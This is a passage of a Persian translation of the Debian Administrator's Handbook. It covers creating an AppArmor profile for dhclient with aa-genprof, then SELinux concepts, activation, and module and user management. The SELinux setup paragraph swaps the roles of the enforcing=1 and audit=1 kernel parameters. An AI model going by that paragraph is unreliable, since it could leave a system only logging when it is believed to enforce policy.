        <para>بسته <emphasis role="pkg">apparmor-profiles</emphasis> شامل پروفایل‌هایی است که توسط جامعه کاربری AppArmor مدیریت می‌شوند. برای دریافت پروفایل‌های بیشتر می‌توانید بسته <emphasis role="pkg">apparmor-profiles-extra</emphasis> را نصب کرده که شامل پروفایل‌های توسعه‌یافته توسط دبیان و اوبونتو می‌باشند.</para>
      </sidebar>
      <para>حالت هر پروفایل می‌تواند با استفاده از فراخوانی‌های <command>aa-enforce</command> و <command>aa-complain</command> به وضعیت enforcing و complaining تغییر یابد که اینکار به عنوان پارامتر در مسیر اجرایی برنامه یا مسیر فایل خطی مشی امنیتی صورت می‌پذیرد. به علاوه، یک پروفایل می‌تواند با استفاده از <command>aa-disable</command> غیرفعال شده یا در حالت audit (برای ثبت فراخوانی‌های سیستمی مجاز) با استفاده از <command>aa-audit</command> قرار گیرد.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>ایجاد یک پروفایل جدید</title>
      <para>با اینکه ایجاد یک پروفایل AppArmor کار ساده‌ای است، اما اکثر برنامه‌ها چنین پروفایلی ندارند. این قسمت به شما نشان می‌دهد که چطور می‌توان یک پروفایل جدید را از ابتدا و با استفاده از برنامه هدف ایجاد کرد تا AppArmor با مانیتور کردن فراخوانی سیستمی به آن بتواند منابع مصرفی‌اش را تحت نظر قرار دهد.</para>
      <para>مهمترین برنامه‌هایی که باید دسترسی محدود داشته باشند تحت شبکه بوده و آن‌هایی هستند که بیشتر هدف حملات راه‌دور قرار می‌گیرند. به همین دلیل است که AppArmor یک دستور متداول <command>aa-unconfined</command> را فراهم می‌کند تا فهرستی از برنامه‌های تحت شبکه با سوکت باز که پروفایل مشخصی ندارند بدست آید. با گزینه <literal>--paranoid</literal> شما فهرستی از تمام فرآیندهای تعریف نشده که حداقل یک ارتباط فعال شبکه را دارند دریافت می‌کنید.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>در مثال پیش رو، تلاش می‌کنیم که یک پروفایل برای <command>/sbin/dhclient</command> ایجاد کنیم. برای این منظور از <command>aa-genprof dhclient</command> استفاده می‌کنیم. این دستور از شما دعوت می‌کند تا از برنامه در پنجره دیگری استفاده کنید و زمانی که به پایان رسید به <command>aa-genprof</command> بازگشته تا رویدادهای سیستمی مورد نظر AppArmor پیمایش شوند و از میان ‌آن‌ها قوانین دسترسی برنامه مشخص گردند. برای هر رویداد ثبت شده، یک یا چند پیشنهاد برای قانون مورد نظر ارائه می‌دهد که می‌توانید تایید یا به روش‌های دیگر آن‌ها را ویرایش کنید:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>به یاد داشته باشید که برنامه کاراکترهای کنترلی از طرف شما را نشان نمی‌دهد ولی در اینجا به منظور بررسی شیوه عملکرد آن نمایش داده شده‌اند.</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>اولین رویداد تشخیص داده شده مربوط به اجرای برنامه دیگری است. در این مورد، شما چندین انتخاب دارید: می‌توانید برنامه را با پروفایل فرآیند والد آن (گزینه “Inherit”)، با پروفایل اختصاصی خود (گزینه‌های “Profile” و “Named”، که تنها در شیوه گزینش نام تفاوت دارند)، با پروفایل زیرمجموعه فرآیند والد آن (گزینه “Child”)، بدون پروفایل (گزینه “Unconfined”) اجرا کنید یا می‌توانید تصمیم بگیرید که برنامه اصلا اجرا نشود (گزینه “Deny”).</para>
          <para>به یاد داشته باشید که در صورت انتخاب یک پروفایل اختصاصی و عدم وجود آن، این ابزار پروفایل جدید را برای شما ایجاد کرده و در همان قسمت قوانین پیشنهای را به شما ارائه می‌دهد.</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>در سطح کرنل، قدرت ویژه کاربر root به چندین “قابلیت” تقسیم می‌شود. زمانی که یک فراخوانی سیستمی نیازمند ... خاصی است، AppArmor تایید می‌کند آیا پروفایل به برنامه اجازه استفاده از چنین قابلیتی را می‌دهد یا خیر.</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>در اینجا برنامه به دنبال مجوزهای <filename>/etc/nsswitch.conf</filename> است. <command>aa-genprof</command> تشخیص داد که این مجوز توسط چندین “موجودیت” صادر شده و آن‌ها را به عنوان گزینه‌های جایگزین پیشنهاد می‌دهد. یک موجودیت مجموعه‌ای از قوانین دسترسی را فراهم می‌کند که این قوانین منابع مختلفی که معمولا با یکدیگر استفاده می‌شوند را گروه‌بندی می‌کنند. در این مورد بخصوص، فایل معمولا توسط nameservice مرتبط با توابع کتابخانه‌ای C قابل دسترسی است و برای انتخاب گزینه “#include &lt;abstractions/nameservice&gt;” عبارت “3” را وارد کرده و با درج “A” آن را تایید می‌کنیم.</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>برنامه قصد ایجاد فایل <filename>/run/dhclient-eth0.pid</filename> را دارد. اگر فقط اجازه ایجاد چنین فایل ویژه‌ای را بدهیم، برنامه زمانی که کاربر از آن در یک رابط شبکه دیگر استفاده کند کار نخواهد کرد. بنابراین با انتخاب “New” نام فایل را به عبارت متداول‌تر “/run/dhclient*.pid” قبل از اینکه توسط “Allow” ثبت شود تغییر می‌دهیم.</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>نکته اینکه این درخواست دسترسی قسمتی از پروفایل dhclient نبوده ولی در پروفایل جدید فراهم شده توسط <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> در زمان اختصاص پروفایل ویژه به آن قرار دارد.</para>
          <para>پس از بازرسی تمام رویدادهای ثبت شده، برنامه پیشنهاد می‌دهد که تمام پروفایل‌های ایجاد شده در زمان اجرا ذخیره‌سازی شوند. در این مورد، دو پروفایل داریم که به صورت همزمان با استفاده از “Save” می‌توانیم ذخیره‌سازی کنیم (اما امکان ذخیره‌سازی انفرادی آن‌ها نیز وجود دارد) قبل از اینکه برنامه را با “Finish” به پایان برسانیم.</para>
        </callout>
      </calloutlist>
      <para><command>aa-genprof</command> در حقیقت به عنوان یک لایه انتزاعی برای <command>aa-logprof</command> عمل می‌کند: این ابزار یک پروفایل خالی ایجاد کرده، آن را در حالت complain قرار می‌دهد و با اجرای <command>aa-logprof</command>، که ابزاری برای بروزرسانی پروفایل است، محتویات آن را مبتنی با رویدادهای ثبت شده در سیستم برورزسانی می‌کند. بنابراین در زمان دیگری می‌توانید با اجرای این ابزار پروفایل خود را بهینه‌سازی کنید.</para>
      <para>اگر می‌خواهید که پروفایل تولید شده کامل باشد، باید از برنامه به شیوه‌ای که توضیح داده شده است استفاده کنید. در مورد dhclient، یعنی آن را با استفاده از Network Manager، ifupdown یا manual اجرا کنید. در انتها، ممکن است فایل <filename>/etc/apparmor.d/sbin.dhclient</filename> مشابه به این را دریافت کنید:</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>مقدمه‌ای بر SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>اصول</title>

      <para>SELinux که مخفف عبارت <emphasis>Security Enhanced Linux</emphasis> است، یک سیستم <emphasis>Mandatory Access Control</emphasis> مبتنی بر رابط LSM یا <emphasis>Linux Security Modules</emphasis> در لینوکس است. در عمل، کرنل قبل از هر فراخوانی سیستمی از SELinux پرس و جو می‌کند آیا فرآیند جاری مجاز به اجرای عملیات فوق‌الذکر می‌باشد یا خیر.</para>

      <para>SELinux از مجموعه قوانین - که بنام <emphasis>policy</emphasis> شناخته می‌شوند - استفاده کرده تا عملیات را مجاز یا ممنوع کند. این قوانین به سختی ایجاد می‌شوند. خوشبختانه، دو خط مشی استاندارد <emphasis>targeted</emphasis> و <emphasis>strict</emphasis> فراهم شده‌اند که طیف گسترده‌ای از کار را بر عهده می‌گیرند.</para>

      <para>با استفاده از SELinux، مدیریت دسترسی به شیوه‌ای کاملا متفاوت با سیستم‌های سنتی یونیکس انجام می‌شود. دسترسی یک فرآیند کاملا مبتنی بر <emphasis>زمینه امنیتی</emphasis> آن خواهد بود. این زمینه توسط <emphasis>شناسه</emphasis> کاربری که فرآیند را آغاز کرده است تعریف می‌شود، همراه با <emphasis>نقش</emphasis> و <emphasis>دامنه</emphasis> که کاربر در آن زمان داشته است. این حقوق کاملا مبتنی بر دامنه کار هستند، اما انتقال بین دامنه‌ها توسط نقش‌های کاربری کنترل می‌شود. در نهایت، انتقال‌های احتمالی بین چند نقش مبتنی بر شناسه کاربری خواهد بود.</para>

      <figure>
        <title>زمینه‌های امنیتی و کاربران یونیکس</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>در عمل، حین ورود به سیستم، یک زمینه امنیتی پیشفرض به کاربر اختصاص می‌یابد (با توجه به نقش‌هایی که مجاز به دریافت آن هستند). این عمل دامنه فعلی را تعریف می‌کند که در آن تمام فرآیندهای فرزند نگهداری می‌شوند. اگر قصد تغییر نقش فعلی و دامنه اختصاصی آن را دارید باید از دستور <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> استفاده کنید (معمولا تنها یک دامنه منفرد برای هر نقش وجود دارد، پس پارامتر <literal>-t</literal> می‌تواند حذف گردد). این دستور با درخواست گذرواژه، شما را احرازهویت می‌‌کند. این ویژگی باعث می‌شود که برنامه‌ها به صورت خودکار نتوانند بین نقش‌ها تعویض شوند. چنین تغییراتی تنها زمانی اتفاق می‌افتند که به صورت صریح در خط مشی SELinux آمده باشند.</para>

      <para>به طور مشخص این دسترسی‌ها به تمام <emphasis>اشیا</emphasis> متعلق نیستند (فایل‌ها، دایرکتوری‌ها، سوکت‌ها، دستگاه‌ها و از این قبیل). می‌توانند از هر شی به دیگری متفاوت باشند. برای دستیابی به این منظور، هر شی به یک <emphasis>نوع</emphasis> اختصاص می‌یابد (اینکار بنام برچسب‌گذاری شناخته می‌شود). دسترسی‌های یک دامنه توسط مجموعه‌ای از عمیات (غیر)مجاز روی این انواع بیان می‌شوند (و به طور غیرمستقیم، روی تمام اشیایی که با این نوع برچسب‌گذاری شده‌اند).</para>

      <sidebar>
        <title><emphasis>اضافی</emphasis> دامنه‌ها و انواع برابر هستند</title>

	<para>در ساختار درونی، یک دامنه تنها یک نوع است که فقط به فرآیندها اختصاص می‌یابد. به همین دلیل است که دامنه‌ها همراه با پسوند <literal>_t</literal> درست مانند سایر انواع اشیا بکار می‌روند.</para>
      </sidebar>

      <para>به صورت پیشفرض، یک برنامه دامنه خود را از کاربری که فرآیند را آغاز کرده است به ارث می‌برد، اما خطی مشی استاندارد SELinux انتظار دارد که برنامه‌های مهم در دامنه‌های اختصاصی اجرا شوند. برای دستیابی به این منظور، آن برنامه‌های اجرایی همراه با یک نوع اختصاصی برچسب‌گذاری می‌شوند (برای نمونه <command>ssh</command> توسط <literal>ssh_exec_t</literal> برچسب‌گذاری شده و زمانی که برنامه آغاز شود به صورت خودکار به دامنه <literal>ssh_t</literal> تغییر می‌یابد). این مکانیزم خودکار انتقال دامنه امکان اختصاص دسترسی‌های لازم برای هر بر نامه را فراهم می‌کند. این یک اصل پایه در SELinux به حساب می‌آید.</para>

      <figure>
        <title>انتقال خودکار بین دامنه‌ها</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>در عمل</emphasis> یافتن زمینه امنیتی</title>
        <indexterm><primary>زمینه امنیتی</primary></indexterm>
        <indexterm><primary>زمینه، زمینه امنیتی</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>برای یافتن زمینه امنیتی یک فرآیند، باید از گزینه <literal>Z</literal> دستور <command>ps</command> استفاده کنید.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>فیلد اول شامل شناسه، نقش، دامنه و سطح MCS است که با کاما جدا شده‌اند. سطح MCS یا <emphasis>Multi-Category Security</emphasis> پارامتری است که در برپایی محرمانگی از محافظت خط مشی دخالت دارد، که دسترسی به فایل‌ها را مبتنی بر میزان حساسیت آن‌ها کنترل می‌کند. این ویژگی در کتاب توضیح داده نمی‌شود.</para>

	<para>برای یافتن زمینه امنیتی در یک پوسته، باید <command>id -Z</command> را فراخوانی کنید.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>در نهایت، برای یافتن نوع اختصاص یافته به یک فایل، می‌توانید از <command>ls -Z</command> استفاده کنید.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>شایان ذکر است که شناسه و نقش اختصاص یافته به یک فایل از اهمیت خاصی برخوردار نیستند (هیچگاه استفاده نمی‌شوند)، اما به دلیل یکنواخت بودن، تمام اشیا شامل زمینه امنیتی کاملی خواهند بود.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>راه‌اندازی SELinux</title>

      <para>پشتیبانی از SELinux درون کرنل‌های استاندارد دبیان قرار دارد. ابزار اصلی یونیکس از SELinux بدون کوچک‌ترین تغییری پشتیبانی می‌کنند. بنابراین فعال‌سازی SELinux کار به نسبت ساده‌ای است.</para>

      <para>دستور <command>apt install selinux-basics selinux-policy-default</command> به صورت خودکار تمام بسته‌های مورد نیاز برای پیکربندی یک سیستم SELinux را نصب می‌کند.</para>

      <sidebar>
        <title><emphasis>احتیاط</emphasis> نبود خط مشی مرجع در توزیع jessie</title>
        <para>متاسفانه، نگهدارندگان بسته سورس <emphasis role="pkg">refpolicy</emphasis> اقدام به رفع باگ‌های حیاتی در بسته خود نکرده و این بسته از jessie حذف شده است. به این معنی که بسته‌های <emphasis role="pkg">selinux-policy-*</emphasis> در حال حاضر قادر به نصب در jessie نبوده و باید از منبع دیگری دریافت گردند. امیدواریم که این بسته‌ها در یکی از انتشارهای نقطه‌ای یا jessie-backports قرار گیرند. در حال حاضر، می‌توانید آن‌ها را از قسمت unstable دریافت کنید.</para>
        <para>این موقعیت ناراحت‌کننده حداقل نشان می‌دهد که SELinux در مجموعه کاربران/توسعه‌دهندگان که نسخه‌های در حال توسعه دبیان را اجرا می‌کنند از محبوبیت بالایی برخوردار نیست. پس، اگر مجبور به استفاده از SELinux هستید، باید انتظار داشته باشید که خط مشی پیشفرض آن به درستی کار نکند و شاید نیاز باشد زمان بیشتری را برای برطرف کردن نیاز خاص خود با استفاده از آن در نظر بگیرید.</para>
      </sidebar>

      <para>بسته <emphasis role="pkg">selinux-policy-default</emphasis> شامل مجموعه قوانین استاندارد است. به صورت پیشفرض، این خط مشی تنها دسترسی به برخی سرویس‌های مشخص را محدود می‌کند. نشست‌های سمت کاربر محدود نیستند و از این رو بعید بنظر می‌رسد که SELinux عملیات مرتبط با کاربران مجاز را مسدود سازد. با این حال، اینکار منجر به بهبود امنیت سرویس‌های سیستمی می‌شود. برای راه‌انداری خط مشی که برابر با قوانین “strict” قدیمی باشد، تنها باید ماژول <literal>unconfined</literal> را غیرفعال کنید (مدیریت ماژول‌ها در ادامه آورده می‌شود).</para>

      <para>زمانی که خط مشی مشخص گردد، باید تمام فایل‌های موجود را برچسب‌گذاری کنید (به این معنی که یک نوع به آن‌ها اختصاص دهید). این عملیات باید به صورت دستی توسط <command>fixfiles relabel</command> صورت پذیرد.</para>

      <para>اکنون سیستم SELinux آماده است. برای فعال‌سازی آن، باید پارامتر <literal>selinux=1 security=selinux</literal> را به کرنل لینوکس اضافه کنید. پارامتر <literal>enforcing=1</literal> امکان ثبت گزارش در SELinux که تمام عملیات غیرمجاز را ثبت می‌کند. در نهایت، پارامتر <literal>audit=1</literal> قوانین را برای برنامه‌ها اجرایی می‌کند: بدون این پارامتر SELinux در حالت پیشفرض <emphasis>permissive</emphasis> خود فعالیت کرده به صورتی که عملیات غیرمجاز ثبت شده ولی هنوز اجرا می‌شوند. برای افزودن پارامترهای مورد نیاز باید فایل پیکربندی راه‌انداز GRUB را تغییر دهید. یک روش ساده برای اینکار تغییر متغیر <literal>GRUB_CMDLINE_LINUX</literal> در <filename>/etc/default/grub</filename> و اجرای <command>update-grub</command> است. SELinux پس از راه‌اندازی مجدد سیستم فعال‌سازی می‌شود.</para>

      <para>شایان ذکر است که اسکریپت <command>selinux-activate</command> این عملیات را خودکارسازی کرده و در راه‌اندازی بعدی عملیات برچسب‌گذاری را انجام می‌دهد (که این عمل از ایجاد فایل‌های برچسب‌گذاری نشده در زمان غیرفعال بودن SELinux و زمانی که عملیات برچسب‌گذاری انجام می‌شود، پیشگیری می‌کند).</para>
    </section>
    <section id="sect.selinux-management">
      <title>مدیریت یک سیستم SELinux</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>خط مشی SELinux مجموعه‌ای از قوانین ماژولار است که نصب آن با شناسایی و فعال‌سازی خودکار تمام ماژول‌های مبتنی بر سرویس‌های نصب شده فعالیت می‌کند. از این رو سیستم بلافاصله قابل استفاده است. با این حال، زمانی که یک سرویس پس از خط مشی SELinux نصب می‌شود، باید قادر باشید تا ماژول مرتبط با آن را فعال‌سازی کنید. هدف دستور <command>semodule</command> نیز همین است. علاوه بر این، باید بتوانید نقش‌های مورد نیاز هر کاربر را تعریف کنید که اینکار با استفاده از دستور <command>semanage</command> انجام می‌شود.</para>

      <para>این دو دستور می‌توانند به منظور تغییر پیکربندی SELinux، که در <filename>/etc/selinux/default/</filename> ذخیره‌سازی شده است، بکار روند. برخلاف تمام فایل‌های پیکربندی که می‌توانید در <filename>/etc/</filename> پیدا کنید، این فایل‌ها نباید به صورت دستی تغییر یابند. باید از برنامه‌های مخصوص برای تغییر آن‌ها استفاده کنید.</para>

      <sidebar>
        <title><emphasis>مطالعه بیشتر</emphasis> مستندات بیشتر</title>

	<para>از آنجا که NSA هیچ مستندات رسمی در این حوزه ارائه نمی‌دهد، جامعه کاربری اقدام به برپایی یک ویکی برای جبران این مساله نموده است. اطلاعات زیادی در این ویکی وجود دارد، اما باید آگاه باشید که اغلب مشارکت‌کنندگان به SELinux کاربران فدورا هستند (که SELinux در آن به صورت پیشفرض نصب شده است). از این رو مستندات بیشتر در رابطه با این توزیع گردآوری شده است. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>همچنین باید نگاهی به ویکی اختصاصی دبیان همراه با وبلاگ راسل کوکر بیندازید، که یکی از فعال‌ترین توسعه‌دهندگان دبیان در پشتیبانی از SELinux است. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>مدیریت ماژول‌های SELinux</title>

	<para>ماژول‌های موجود SELinux درون دایرکتوری <filename>/usr/share/selinux/default/</filename> قرار دارند. برای فعال‌سازی یکی از این ماژول‌ها در پیکربندی فعلی، باید از <command>semodule -i <replaceable>module.pp.bz2</replaceable></command> استفاده کنید. پسوند <emphasis>pp.bz2</emphasis> مخفف عبارت <emphasis>policy package</emphasis> است (که توسط bzip2 فشرده‌سازی شده است).</para>

	<para>حذف یک ماژول از پیکربندی موجود با استفاده از <command>semodule -r <replaceable>module</replaceable></command> صورت می‌پذیرد. در نهایت، دستور <command>semodule -l</command> فهرستی از تمام ماژول‌های نصب شده را نشان می‌دهد. همچنین شماره نسخه را نیز نمایش می‌دهد. ماژول‌ها می‌توانند توسط <command>semodule -e</command> فعال یا <command>semodule -d</command> غیرفعال شوند.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> بلافاصله پیکربندی جدید را بارگیری می‌کند مگر اینکه از گزینه <literal>-n</literal> استفاده کنید. شایان ذکر است که برنامه به صورت پیشفرض با پیکربندی فعلی کار می‌کند (که توسط متغیر <literal>SELINUXTYPE</literal> در <filename>/etc/selinux/config</filename> مشخص شده است)، اما می‌توانید آن را با استفاده از گزینه <literal>-s</literal> تغییر دهید.</para>
      </section>
      <section>
        <title>مدیریت شناسه‌ها</title>

	<para>هر مرتبه که کاربر وارد سیستم می‌شود، یک شناسه SELinux به وی اختصاص می‌یابد. این شناسه مشخص می‌کند کاربر از چه نقش‌هایی می‌تواند استفاده کند. این دو نگاشت (از کاربر به شناسه و از شناسه به نقش‌ها) توسط دستور <command>semanage</command> قابل پیکربندی هستند.</para>

	<para>حتی اگر شیوه نگارش دستور با مفاهیم مطرح شده مشابه باشد، باید صفحه راهنمای <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> را مطالعه کنید. گزینه‌های مشابهی برای دستورات زیر-مجموعه پیدا خواهید کرد: <literal>-a</literal> برای افزودن، <literal>-d</literal> برای حذف، <literal>-m</literal> برای تغییر، <literal>-l</literal> برای فهرست کردن و <literal>-t</literal> برای مشخص کردن یک نوع (یا دامنه).</para>

	<para><command>semanage login -l</command> نگاشت فعلی بین شناسه‌های کاربر و هویت‌های SELinux را فهرست می‌کند. کاربرانی که هیچ مدخل واضحی ندارند از شناسه موجود در مدخل <literal>__default__</literal> استفاده می‌کنند. دستور <command>semanage login -a -s user_u <replaceable>user</replaceable></command> شناسه <emphasis>user_u</emphasis> را به کاربر مورد نظر اختصاص می‌دهد. در نهایت، <command>semanage login -d <replaceable>user</replaceable></command> نگاشت موجود برای کاربر را از بین می‌برد.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

